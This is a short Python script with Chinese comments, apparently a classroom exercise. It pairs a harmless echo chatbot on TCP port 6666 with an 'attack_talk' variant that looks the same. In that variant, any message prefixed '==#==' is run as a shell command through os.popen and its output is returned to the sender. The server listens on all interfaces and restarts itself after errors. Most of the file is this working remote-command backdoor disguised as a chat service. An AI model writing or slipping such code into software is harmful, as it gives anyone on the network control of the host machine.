import os
import socket


def normal_talk():
    s = socket.socket()
    # s.bind(('127.0.0.1', 6666))      # 只允许本设备访问
    s.bind(('0.0.0.0', 6666))          #  所有IP地址均可访问
    s.listen()
    channel, client = s.accept()        # 阻塞
    while True:
        # channel, client = s.accept()        # 下次执行时阻塞
        receive = channel.recv(1024).decode()
        print(f"收到消息：{receive}")
        reply = receive.replace("吗？", "!")
        channel.send((reply.encode()))
    # s.cloe()                         # 不会执行

def attack_talk():
    try:
        s = socket.socket()
        s.bind(('0.0.0.0', 6666))
        s.listen()
        chanel, client = s.accept()
        while True:
            receive = chanel.recv(10240).decode()

            # ==#==,command
            if receive.startswith('==#=='):
                command = receive.split(',')[-1]
                reply = os.popen(command).read()
                chanel.send(f"{command}的运行结果：\n{reply}".encode())
            else:
                print(f"收到消息：{receive}")
                reply = receive.replace("吗？", "!")
                chanel.send(reply.encode())
    except:
        s.close()
        attack_talk()


if __name__ == '__main__':
    # normal_talk()
    attack_talk()
